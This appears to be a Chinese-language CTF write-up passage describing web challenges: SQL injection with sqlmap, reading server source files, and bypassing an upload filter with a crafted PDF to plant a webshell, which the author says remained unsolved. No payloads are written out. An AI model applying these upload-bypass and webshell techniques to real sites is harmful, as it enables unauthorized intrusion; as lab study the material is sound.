`http://admin-writeup-test.actf.lol/`

这个题应该算是做完了。

感受就是手动注入的话我是不可能完成这样的查询的，sqlmap 还是比较强大的

另外如果能拿到 shell 的话，就可以直接读取文件，这样就会方便很多

### 实例 4

首先是获取源码，在`nginx.conf`下获取到了 root 地址

直接按照上一题的方法获取到了`index.php`的内容

发现屏蔽了所有除了 pdf 格式之外的所有内容，那么就构造了一个 pdf 文件，然后上传

结果又发现屏蔽了`<?php`,所以采用

但是这个题和 php include 不同之处是文件不是直接导入进来的，所以需要找到一个包含的地方。

直接上传用蚁剑进行连接是不太行的。

最后没有尝试查出来这个点应该怎么写。
